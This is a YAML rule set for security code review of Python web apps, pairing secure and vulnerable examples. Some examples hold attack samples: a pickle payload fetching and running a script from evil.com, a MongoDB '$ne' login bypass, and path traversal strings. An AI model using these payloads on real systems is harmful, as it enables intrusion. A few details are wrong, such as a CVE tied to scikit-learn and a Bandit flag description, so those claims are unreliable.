layer: rules
domain: security
knowledge:
- id: CR-SEC-CORS-001
  text: 'CORS: Never use allowed_origins=[] or allowed_origins=None as deny-all.'
  why: Empty list and None behavior varies by framework version. Flask-CORS treats None as 'allow all origins' in some versions.
    This is NOT deny-by-default.
  how_to_do_right: Use cors_allowed_origins='same-origin' for deny-all, or an explicit URL string for specific origins. Load
    from env var with safe default.
  severity: critical
  technologies:
    lang: [python]
    framework: [flask]
    library: [cors, flask-cors, flask-socketio]
  domains:
    domain: [security, architecture]
    concern: [web]
  example_good: 'cors_allowed_origins = os.getenv("CORS_ORIGINS", "same-origin")

    socketio = SocketIO(app, cors_allowed_origins=cors_allowed_origins)

    '
  example_bad: '# DANGEROUS: None may mean "allow all" depending on version

    socketio = SocketIO(app, cors_allowed_origins=None)

    # DANGEROUS: Empty list behavior is undefined

    socketio = SocketIO(app, cors_allowed_origins=[])

    '
  when_applies: Any project using Flask web applications, APIs with cross-origin requirements, Flask-CORS, or Flask-SocketIO
  when_not_applies: purely internal tools with no external exposure, throwaway scripts, or local development utilities
  sources: ["https://flask-socketio.readthedocs.io/en/latest/getting_started.html#cross-origin-controls", "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Origin_Resource_Sharing_Cheat_Sheet.html"]
- id: CR-SEC-CORS-002
  text: 'CORS: Never use wildcard ''*'' in production.'
  why: Wildcard CORS allows any website to make authenticated requests to your API. Combined with credentials, this enables
    CSRF attacks from any domain.
  how_to_do_right: Explicitly list allowed origins. Use environment variable for per-deployment configuration.
  severity: critical
  technologies:
    lang: [python]
    framework: [flask, fastapi]
    library: [cors]
  domains:
    domain: [security, architecture, api]
    concern: [web]
  example_good: 'CORS(app, origins=["https://myapp.com", "https://staging.myapp.com"])

    '
  example_bad: 'CORS(app, origins="*")  # Any website can call your API

    '
  when_applies: Any project using Flask web applications, FastAPI async web services, or APIs with cross-origin requirements
  when_not_applies: purely internal tools with no external exposure, throwaway scripts, or local development utilities
  sources: ["https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS", "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Origin_Resource_Sharing_Cheat_Sheet.html"]
- id: CR-SEC-AUTH-001
  text: Auth check must be the FIRST operation in every handler, before any data processing.
  why: Processing data before authentication means unauthenticated users can trigger expensive operations, access validation
    logic, or cause side effects.
  how_to_do_right: Use a decorator or middleware that runs before the handler body. Check auth token validity, then extract
    user context, then process request.
  severity: critical
  technologies:
    lang: [python]
    framework: [flask, fastapi, backend, express]
  domains:
    domain: [security, architecture, api]
  example_good: "@app.route(\"/api/data\")\n@require_auth  # Runs FIRST — rejects before handler body\ndef get_data():\n \
    \   return jsonify(data)\n"
  example_bad: "@app.route(\"/api/data\")\ndef get_data():\n    data = expensive_query()  # Runs before auth check!\n    if\
    \ not check_auth(request):\n        return \"Unauthorized\", 401\n    return jsonify(data)\n"
  when_applies: Any project using Flask web applications, FastAPI async web services, or Express.js/Node.js servers
  when_not_applies: purely internal tools with no external exposure, throwaway scripts, or local development utilities
  sources: ["https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"]
- id: CR-SEC-AUTH-002
  text: WebSocket connections must authenticate on connect, not on first message.
  why: An unauthenticated WebSocket connection can receive broadcasts, observe event patterns, and potentially inject messages
    before any auth check on a message handler.
  how_to_do_right: Validate auth token in the @socketio.on('connect') handler. Disconnect immediately if invalid. Store user
    context in session.
  severity: critical
  technologies:
    library: [flask-socketio, socket, io]
    platform: [websocket]
  domains:
    domain: [security]
    concern: [websocket]
  example_good: "@socketio.on('connect')\ndef handle_connect(auth):\n    token = auth.get('token') if auth else request.args.get('token')\n\
    \    if not validate_token(token):\n        disconnect()\n        return False\n"
  example_bad: "@socketio.on('connect')\ndef handle_connect():\n    pass  # Anyone can connect — auth checked later (maybe)\n"
  when_applies: Any project using Flask-SocketIO, real-time WebSocket connections, or Socket.IO real-time apps
  when_not_applies: purely internal tools with no external exposure, throwaway scripts, or local development utilities
  sources: ["https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#websockets"]
- id: CR-SEC-PATH-001
  text: Never construct file paths from user input without containment validation.
  why: User input like '../../../etc/passwd' can escape the intended directory. Path.resolve() alone doesn't prevent traversal
    if the base directory isn't verified.
  how_to_do_right: After resolving the path, use .is_relative_to(base_dir) to verify containment. Reject if the resolved path
    escapes the allowed directory.
  severity: critical
  technologies:
    lang: [python]
    framework: [flask, fastapi]
  domains:
    domain: [security]
    concern: [filesystem]
  example_good: "base = Path(\"/app/uploads\")\nuser_path = (base / user_input).resolve()\nif not user_path.is_relative_to(base):\n\
    \    raise ValueError(\"Path traversal detected\")\n"
  example_bad: '# DANGEROUS: user_input could be "../../../etc/passwd"

    path = Path("/app/uploads") / user_input

    '
  when_applies: Any project using Python codebases, Flask web applications, or FastAPI async web services
  when_not_applies: purely internal tools with no external exposure, throwaway scripts, or local development utilities
  sources: ["https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html#file-path-validation", "https://docs.python.org/3/library/pathlib.html#pathlib.PurePath.is_relative_to"]
- id: CR-SEC-ENV-001
  text: Environment variables used in file paths must be validated for path containment.
  why: Environment variables can be manipulated in some deployment environments. An env var containing '../' can cause path
    traversal just like user input.
  how_to_do_right: Validate that env-derived paths resolve within expected directories. Use absolute paths and verify with
    is_relative_to().
  severity: high
  technologies:
    lang: [python]
  domains:
    domain: [security]
    concern: [configuration]
  when_applies: Projects using Python codebases
  when_not_applies: purely internal tools with no external exposure, throwaway scripts, or local development utilities. projects
    not using Python
  example_good: |
    upload_dir = Path(os.getenv("UPLOAD_DIR", "/app/uploads")).resolve()
    if not upload_dir.is_relative_to(Path("/app")):
        raise ValueError("UPLOAD_DIR must be under /app")
  example_bad: |
    upload_dir = Path(os.getenv("UPLOAD_DIR"))
    # UPLOAD_DIR="../../../etc" => path traversal via env var
  sources: ["https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html#file-path-validation"]
- id: CR-SEC-DEBUG-001
  text: Never use debug=True or bind to 0.0.0.0 in production code.
  why: debug=True enables interactive debugger (remote code execution). 0.0.0.0 exposes the service to all network interfaces,
    not just localhost.
  how_to_do_right: Default debug=False and host='127.0.0.1'. Load from env with safe defaults. Use separate dev/prod configs.
  severity: critical
  technologies:
    lang: [python]
    framework: [flask, fastapi]
  domains:
    domain: [security, operations, devops]
  example_good: "app.run(\n    host=os.getenv(\"HOST\", \"127.0.0.1\"),\n    port=int(os.getenv(\"PORT\", \"5000\")),\n  \
    \  debug=os.getenv(\"DEBUG\", \"false\").lower() == \"true\",\n)\n"
  example_bad: 'app.run(host="0.0.0.0", port=5000, debug=True)

    '
  when_applies: Any project using Flask web applications, FastAPI async web services, or Python codebases
  when_not_applies: purely internal tools with no external exposure, throwaway scripts, or local development utilities
  sources: ["https://flask.palletsprojects.com/en/stable/debugging/", "https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html"]
- id: CR-SEC-SUBPROCESS-001
  text: Never pass user-controlled strings to subprocess without sanitization.
  why: Command injection allows arbitrary code execution. Even 'safe-looking' inputs can contain shell metacharacters (;,
    |, $(), backticks).
  how_to_do_right: Use subprocess with shell=False and pass args as a list. Never use os.system() or shell=True with user
    input.
  severity: critical
  technologies:
    lang: [python]
  domains:
    domain: [security]
  example_good: 'subprocess.run(["ls", "-la", validated_path], shell=False, check=True)

    '
  example_bad: 'os.system(f"ls -la {user_input}")  # Command injection!

    subprocess.run(f"process {user_input}", shell=True)  # Also dangerous

    '
  when_applies: Any project using Python codebases
  when_not_applies: purely internal tools with no external exposure, throwaway scripts, or local development utilities. projects
    not using Python
  sources: ["https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html", "https://docs.python.org/3/library/subprocess.html#security-considerations"]
- id: CR-SEC-SECRETS-001
  text: Never hardcode secrets, API keys, or passwords in source code.
  why: Source code is committed to version control, shared across teams, and potentially open-sourced. Hardcoded secrets in
    code = leaked secrets.
  how_to_do_right: Use environment variables loaded at runtime via os.getenv(). Store secrets in .env files (gitignored) or
    secret managers.
  severity: critical
  technologies:
    lang: [python, javascript]
  domains:
    domain: [security]
    concern: [configuration]
  example_good: |
    import os
    API_KEY = os.getenv("API_KEY")
    if not API_KEY:
        raise RuntimeError("API_KEY environment variable required")
  example_bad: |
    API_KEY = "sk-live-abc123xyz"  # Hardcoded in source — leaked via git!
  when_applies: Any project using Python codebases or JavaScript/TypeScript projects
  when_not_applies: purely internal tools with no external exposure, throwaway scripts, or local development utilities. projects
    not using Python or JavaScript
  sources: ["https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html"]
- id: CR-SEC-INPUT-001
  text: Validate input types AND ranges, not just presence.
  why: Checking 'if value' misses empty strings, zero, negative numbers, and type mismatches. A page=-1 or limit=999999 can
    cause DOS or data leaks.
  how_to_do_right: Use Pydantic models with validators for complex input. For simple values, check type, range, and format
    explicitly.
  severity: high
  technologies:
    lang: [python]
    framework: [flask, fastapi]
  domains:
    domain: [security, architecture, api]
  when_applies: Projects using Python codebases, Flask web applications, or FastAPI async web services
  when_not_applies: purely internal tools with no external exposure, throwaway scripts, or local development utilities
  example_good: |
    page = request.args.get("page", 1, type=int)
    if not (1 <= page <= 1000):
        return jsonify({"error": "page must be 1-1000"}), 400
    limit = min(request.args.get("limit", 20, type=int), 100)
  example_bad: |
    page = request.args.get("page")  # String, could be -1
    limit = request.args.get("limit")  # Could be 999999
    results = db.query(Item).offset(page * limit).limit(limit).all()
  sources: ["https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html"]
- id: CR-SEC-INPUT-002
  text: SQL queries must use parameterized statements, never string concatenation.
  why: String concatenation with user input enables SQL injection — the most exploited web vulnerability for 20+ years.
  how_to_do_right: Use ORM queries (SQLAlchemy) or parameterized queries (cursor.execute('SELECT * FROM users WHERE id = ?',
    (user_id,))). Never f-string SQL.
  severity: critical
  technologies:
    lang: [python]
    framework: [sqlalchemy]
    platform: [postgresql]
  domains:
    domain: [security, architecture]
    concern: [data, database]
  example_good: 'db.session.query(User).filter(User.id == user_id).first()

    '
  example_bad: 'db.execute(f"SELECT * FROM users WHERE id = ''{user_input}''")

    '
  when_applies: Any project using Python codebases, SQLAlchemy ORM interactions, or PostgreSQL databases
  when_not_applies: purely internal tools with no external exposure, throwaway scripts, or local development utilities
  sources: ["https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"]
- id: CR-SEC-RATE-001
  text: Public endpoints must have rate limiting.
  why: Without rate limits, attackers can brute-force credentials, scrape data, or DOS the service with request floods.
  how_to_do_right: Apply rate limits at the reverse proxy (nginx) or application level (Flask-Limiter). Use stricter limits
    for auth endpoints.
  severity: high
  technologies:
    lang: [python]
    framework: [flask, fastapi]
    platform: [nginx]
  domains:
    domain: [security, architecture, api]
  when_applies: Projects using Flask web applications, FastAPI async web services, or nginx
  when_not_applies: purely internal tools with no external exposure, throwaway scripts, or local development utilities
  example_good: |
    from flask_limiter import Limiter
    limiter = Limiter(app, default_limits=["100/hour"])

    @app.route("/api/login", methods=["POST"])
    @limiter.limit("5/minute")  # Strict for auth endpoint
    def login():
        return authenticate(request.json)
  example_bad: |
    @app.route("/api/login", methods=["POST"])
    def login():
        return authenticate(request.json)
    # No rate limit — attacker brute-forces 10K passwords/min
  sources: ["https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html", "https://flask-limiter.readthedocs.io/en/stable/"]
- id: CR-SEC-SAST-001
  text: >
    Run Bandit as a SAST gate in CI — configure it with a minimum severity/confidence
    threshold and block merges on HIGH/MEDIUM findings. Never run Bandit only locally;
    it must be a CI enforcement step so every developer's code is checked automatically.
  why: >
    Bandit (OWASP-recommended) scans Python AST for 200+ security issues: hardcoded
    passwords, use of eval(), insecure deserialization, subprocess with shell=True, and
    weak cryptography. Developers miss these during code review because they are subtle.
    At Lyft, mandatory SAST gates caught 60% of security findings before they reached
    staging. Without CI enforcement, SAST becomes optional and ignored.
  how_to_do_right: |
    1. Install: pip install bandit
    2. Create .bandit config: [bandit] exclude_dirs = tests,venv
    3. Run in CI: bandit -r src/ -ll -ii --format json -o bandit_report.json
       -ll = only LOW severity or above, -ii = only MEDIUM confidence or above
    4. Parse exit code: 0 = no issues, 1 = issues found → fail the CI step
    5. For false positives: add inline suppression: # nosec B101 with comment explaining why
    6. Add to pre-commit hook: bandit -r . -ll -ii -q (quick local check before commit)
    7. Track findings over time — set threshold: no new HIGH findings per sprint
  severity: high
  technologies:
    lang: [python]
    framework: [fastapi, flask, django]
  domains:
    domain: [security, devops]
    concern: [sast, ci_cd]
  example_good: |
    # .github/workflows/security.yml
    - name: SAST with Bandit
      run: |
        pip install bandit
        bandit -r src/ -ll -ii --format json -o bandit_report.json
        # Exit 1 if any MEDIUM/HIGH confidence findings
        python -c "
        import json, sys
        with open('bandit_report.json') as f:
            report = json.load(f)
        high_issues = [r for r in report['results']
                       if r['issue_severity'] in ('HIGH', 'MEDIUM')]
        if high_issues:
            for i in high_issues:
                print(f\"FAIL: {i['filename']}:{i['line_number']} {i['issue_text']}\")
            sys.exit(1)
        print(f'PASS: {len(report[\"results\"])} issues (none MEDIUM/HIGH)')
        "
  example_bad: |
    # Running Bandit only manually, not in CI
    # Developer runs locally before important releases
    # Result: feature branches never scanned → SQL injection merged undetected
    # Or: running without severity filter → noise drowns out real issues
    bandit -r src/  # Shows 200+ low-severity style warnings, real issues buried
  when_applies: Any Python project in production or handling sensitive data
  when_not_applies: throwaway scripts, learning projects with no external exposure
  sources:
    - "https://bandit.readthedocs.io/en/latest/"
    - "https://owasp.org/www-project-top-ten/2025/"
- id: CR-SEC-SAST-002
  text: >
    Write custom Semgrep rules for domain-specific patterns — generic SAST misses
    business-logic vulnerabilities like missing authorization checks on financial
    endpoints, unauthenticated WebSocket message handlers, and raw Decimal arithmetic
    on monetary values.
  why: >
    Generic SAST tools (Bandit, SonarQube) cover well-known vulnerability classes but
    cannot know YOUR application's security invariants. Semgrep's pattern language lets
    you encode rules like "every route under /api/admin must have @require_admin" or
    "Decimal('') must never be initialized from user input without validation." A
    financial services team wrote 12 custom Semgrep rules and found 8 critical
    business-logic vulnerabilities that all other tools missed.
  how_to_do_right: |
    1. Install: pip install semgrep
    2. Run OSS registry: semgrep --config=p/python --config=p/security-audit src/
    3. Write custom rule in YAML under .semgrep/rules/:
       - pattern: route_decorator + handler_body without @require_auth decorator
       - pattern: db.execute("..." + user_input)  # catches dynamic SQL
    4. Run custom rules: semgrep --config=.semgrep/rules/ src/
    5. Add to CI: semgrep ci (uses Semgrep App for diff-aware scanning)
    6. Gate: block on severity: ERROR findings, warn on WARNING
  severity: high
  technologies:
    lang: [python, javascript, typescript]
    framework: [fastapi, flask]
  domains:
    domain: [security, devops]
    concern: [sast, custom_rules]
  example_good: |
    # .semgrep/rules/auth_required.yml
    rules:
      - id: flask-route-missing-auth
        patterns:
          - pattern: |
              @app.route(...)
              def $FUNC(...):
                  ...
          - pattern-not: |
              @app.route(...)
              @require_auth
              def $FUNC(...):
                  ...
        message: "Flask route $FUNC is missing @require_auth decorator"
        severity: ERROR
        languages: [python]
        metadata:
          category: security
          cwe: "CWE-306: Missing Authentication"
  example_bad: |
    # Relying only on generic SAST — misses application-specific patterns
    # Generic Bandit/SonarQube passes these:
    @app.route('/api/admin/delete-user')
    def delete_user():  # No @require_auth → ADMIN operation exposed to anyone
        user_id = request.args.get('id')
        db.delete_user(user_id)  # Generic SAST sees no SQL injection → passes
  when_applies: Any production application with security-critical business logic
  when_not_applies: throwaway scripts, low-risk internal tools
  sources:
    - "https://semgrep.dev/docs/writing-rules/overview/"
    - "https://semgrep.dev/r"
- id: CR-SEC-NOSQL-001
  text: >
    Sanitize MongoDB queries to reject operator injection — user input containing
    $ne, $gt, $regex, $where, or any object/array must be refused before reaching the
    query layer. Never pass raw user-supplied dicts to MongoDB find() or findOne().
  why: >
    MongoDB NoSQL injection allows attackers to bypass authentication by injecting query
    operators. The classic attack: POST {"username": "admin", "password": {"$ne": ""}}
    returns the admin user because password is "not equal to empty string" — always true.
    The $regex operator enables password enumeration attacks. The $where operator
    executes arbitrary JavaScript on the server (disabled in MongoDB 7.0+ by default, but
    often enabled in older setups). OWASP classifies NoSQL injection as A03 Injection.
  how_to_do_right: |
    1. Reject any input that is not a primitive type (str, int, float, bool):
       if isinstance(user_input, (dict, list)): raise ValueError("Invalid input type")
    2. For string inputs, reject values starting with '$': if value.startswith('$'): reject
    3. Use Motor/PyMongo with explicit typed parameters:
       collection.find_one({"username": str(username), "password": str(password)})
    4. Enable MongoDB schema validation to enforce field types at the database level
    5. Disable server-side JavaScript: mongod --noscripting (or noScripting: true in config)
    6. Use query builder wrappers that enforce typed predicates — avoid accepting raw dicts
  severity: critical
  technologies:
    lang: [python]
    library: [pymongo, motor, mongoengine]
    platform: [mongodb]
  domains:
    domain: [security]
    concern: [injection, nosql, database]
  example_good: |
    from typing import Any

    def sanitize_string_field(value: Any, field_name: str) -> str:
        """Reject non-strings and operator injection attempts."""
        if not isinstance(value, str):
            raise ValueError(f"{field_name} must be a string, got {type(value)}")
        if value.startswith('$'):
            raise ValueError(f"{field_name} cannot start with '$' (operator injection)")
        if len(value) > 200:
            raise ValueError(f"{field_name} too long")
        return value

    async def login(username: str, password: str):
        safe_username = sanitize_string_field(username, "username")
        safe_password = sanitize_string_field(password, "password")
        user = await db.users.find_one({"username": safe_username})
        # Compare hash separately, never pass password to query
        if user and verify_hash(safe_password, user["password_hash"]):
            return user
        return None
  example_bad: |
    # Passing raw request data directly to MongoDB — injection possible
    async def login(data: dict):
        # Attacker sends: {"username": "admin", "password": {"$ne": ""}}
        user = await db.users.find_one({
            "username": data["username"],   # Could be {"$regex": ".*"}
            "password": data["password"],   # {"$ne": ""} → always true!
        })
        return user  # Always returns admin user → authentication bypass
  when_applies: Any project using MongoDB or other NoSQL databases with query operators
  when_not_applies: projects using only relational databases with parameterized queries
  sources:
    - "https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html"
    - "https://www.acunetix.com/blog/web-security-zone/nosql-injections/"
    - "https://owasp.org/Top10/2025/"
- id: CR-SEC-PICKLE-001
  text: >
    Never use pickle or marshal to deserialize data from untrusted sources — pickle
    executes arbitrary Python code during deserialization. Use JSON, MessagePack, or
    Protocol Buffers for all data exchange with external systems or user input.
  why: >
    Python's pickle module executes __reduce__ methods during deserialization, allowing
    arbitrary code execution. Sending a crafted pickle payload to any endpoint that
    calls pickle.loads() gives the attacker RCE (Remote Code Execution). This is not
    theoretical — CVE-2023-25577 (Werkzeug) and CVE-2019-11358 (scikit-learn) both
    involved pickle deserialization. ML model files (.pkl) loaded from user uploads
    are a common attack vector. OWASP A08:2021 "Software and Data Integrity Failures"
    covers insecure deserialization. The attack requires only network access.
  how_to_do_right: |
    1. Never call pickle.loads() on data from HTTP requests, files, or message queues
    2. Never load ML model files from untrusted sources — sign and verify model artifacts
    3. For ML models: use ONNX (open format), safetensors (safe by design), or torch.load
       with weights_only=True (PyTorch 1.13+)
    4. For config/state: use JSON or YAML (both safe, human-readable)
    5. For binary performance: use MessagePack (msgpack) or Protocol Buffers
    6. If pickle is required internally (never from external): verify HMAC signature
       before deserializing
    7. Scan codebase: grep -r "pickle.loads\|pickle.load\|cPickle" src/ — audit each use
  severity: critical
  technologies:
    lang: [python]
    library: [pickle, sklearn, pytorch, numpy]
  domains:
    domain: [security]
    concern: [deserialization, rce]
  example_good: |
    import json
    import msgpack
    from safetensors import safe_open

    # Config: use JSON (safe, human-readable)
    def save_config(config: dict, path: str):
        with open(path, 'w') as f:
            json.dump(config, f, indent=2)

    def load_config(path: str) -> dict:
        with open(path) as f:
            return json.load(f)  # Safe — JSON cannot execute code

    # ML model: use safetensors (designed to be safe)
    def load_model_weights(path: str):
        with safe_open(path, framework="pt") as f:
            tensors = {k: f.get_tensor(k) for k in f.keys()}
        return tensors

    # PyTorch: weights_only=True prevents arbitrary code execution
    model = torch.load('model.pt', weights_only=True)
  example_bad: |
    # Loading pickle from user upload — RCE vulnerability
    @app.route('/upload-model', methods=['POST'])
    def upload_model():
        model_data = request.files['model'].read()
        model = pickle.loads(model_data)  # CRITICAL: executes attacker code!
        results = model.predict(test_data)
        return jsonify(results)

    # Attacker sends:
    # import os; payload = pickle.dumps(
    #     type('x', (), {'__reduce__': lambda s: (os.system, ('curl evil.com/shell.sh | bash',))})()
    # )
  when_applies: Any Python project receiving data from external systems, users, or files
  when_not_applies: internal serialization between trusted processes with no external input path
  sources:
    - "https://docs.python.org/3/library/pickle.html#restricting-globals"
    - "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"
    - "https://huggingface.co/docs/safetensors/index"
- id: CR-SEC-SUPPLY-001
  text: >
    Defend against supply chain attacks — pin exact package versions with hashes in
    requirements, use a private PyPI mirror or dependency proxy, and audit new
    dependencies before adding them. Typosquatting and dependency confusion attacks
    compromise thousands of projects annually.
  why: >
    Supply chain attacks via PyPI/npm are growing: typosquatting (requests vs requestss),
    dependency confusion (internal package name registered on public PyPI), and
    compromised maintainer accounts. The 2022 PyTorch supply chain attack infected
    nightly builds via a compromised dependency. OWASP Top 10 2025 added "Software
    Supply Chain Failures" as a top-3 category. pip install without hash verification
    allows MITM attacks that substitute malicious packages. A single malicious
    transitive dependency can expose all secrets in the environment.
  how_to_do_right: |
    1. Pin exact versions with hashes: pip-compile --generate-hashes requirements.in
       → requirements.txt with sha256 hashes for every package
    2. Install with verification: pip install --require-hashes -r requirements.txt
    3. Audit new dependencies: pip-audit --requirement requirements.txt (checks CVEs)
    4. Use typosquatting detection: check new package names against known squatters
    5. For internal packages: use a private index and configure pip to prefer it
    6. Enable Dependabot/Renovate for automated security update PRs
    7. Review transitive dependencies: pip-audit recursively checks the full tree
    8. Namespace packages: prefix internal packages with your org name (myorg-utils)
  severity: critical
  technologies:
    lang: [python]
    framework: [fastapi, django, flask]
  domains:
    domain: [security, devops]
    concern: [supply_chain, dependencies]
  example_good: |
    # requirements.txt with hash verification (pip-compile --generate-hashes)
    fastapi==0.111.0 \
        --hash=sha256:abc123...def456 \
        --hash=sha256:aaa111...bbb222
    pydantic==2.7.1 \
        --hash=sha256:ccc333...ddd444

    # Install with mandatory hash check
    # pip install --require-hashes -r requirements.txt

    # CI: audit for known CVEs
    # pip-audit --requirement requirements.txt --format json

    # Pre-merge check for new dependencies
    # pip-audit --requirement requirements.txt
    # Output: No known vulnerabilities found in 47 packages
  example_bad: |
    # Unpinned dependencies — any version can be installed
    # requirements.txt
    fastapi
    pydantic
    requests

    # Or loosely pinned — still vulnerable to patch releases with malware
    # requirements.txt
    fastapi>=0.100
    pydantic~=2.0

    # pip install requests (check spelling: requestss also exists on PyPI!)
    # No hash verification → MITM can substitute malicious version
  when_applies: Any production Python project with external dependencies
  when_not_applies: throwaway scripts with no deployment, isolated research environments
  sources:
    - "https://owasp.org/Top10/2025/A03_2025-Software_Supply_Chain_Failures/"
    - "https://pip.pypa.io/en/stable/topics/secure-installs/"
    - "https://github.com/pypa/pip-audit"
- id: CR-SEC-LLM-001
  text: >
    Treat LLM-generated code as untrusted input — always run SAST and security review
    on AI-generated code before merging. LLMs confidently produce code with SQL
    injection, hardcoded secrets, path traversal, and missing auth checks, often
    passing all linter checks.
  why: >
    GitHub Copilot and similar tools generate plausible-looking code that frequently
    contains security vulnerabilities. A 2023 Stanford study found that developers
    using AI assistants wrote more insecure code and were MORE confident it was secure.
    LLMs are trained on public code, which includes vulnerable examples. The model
    cannot reason about your security context, threat model, or access control
    requirements. OWASP Top 10 for LLMs (2025) includes "Insecure Code Generation"
    as a key risk. Copilot has generated hardcoded AWS keys, unparameterized SQL,
    and pickle deserialization from user input — all passing unit tests.
  how_to_do_right: |
    1. Never merge AI-generated code without SAST scan (Bandit + Semgrep)
    2. Code review checklist for AI-generated code:
       - Are all inputs validated?
       - Are auth checks present on all endpoints?
       - Are there any hardcoded secrets or credentials?
       - Are SQL/NoSQL queries parameterized?
       - Is there any deserialization of external data?
    3. Run: bandit -r ai_generated_module.py -ll -ii before merge
    4. Use diff-aware Semgrep CI to flag every new line from AI
    5. Document which code is AI-generated for audit trail
    6. For financial/auth code: require senior security review regardless of origin
  severity: high
  technologies:
    lang: [python, javascript, typescript]
    framework: [fastapi, flask]
  domains:
    domain: [security, architecture]
    concern: [ai_generated_code, sast]
  example_good: |
    # CI pipeline for AI-generated code review
    - name: Security scan on AI-generated code
      run: |
        # Run SAST on changed files
        git diff --name-only origin/main | grep '\.py$' | xargs bandit -ll -ii
        # Run Semgrep custom rules
        semgrep --config=.semgrep/rules/ $(git diff --name-only origin/main)

    # Code review comment template for AI-generated blocks:
    # [ ] Inputs validated (type + range + whitelist)
    # [ ] Auth check present
    # [ ] No hardcoded values
    # [ ] SQL parameterized
    # [ ] No unsafe deserialization
  example_bad: |
    # Copilot generates this — passes all linting:
    @app.route('/user/<user_id>')
    def get_user(user_id):
        # Copilot generated this — SQL injection AND no auth
        query = f"SELECT * FROM users WHERE id = {user_id}"
        result = db.execute(query)
        return jsonify(result.fetchone())
    # bandit -r . → passes (no shell=True, no obvious patterns)
    # Human review skipped because "Copilot wrote it, should be fine"
    # SQL injection survives to production
  when_applies: Any project using AI code generation tools (Copilot, Cursor, Claude Code)
  when_not_applies: manually written code that already goes through standard review
  sources:
    - "https://owasp.org/www-project-top-10-for-large-language-model-applications/"
    - "https://arxiv.org/abs/2211.03622"
    - "https://bandit.readthedocs.io/en/latest/"
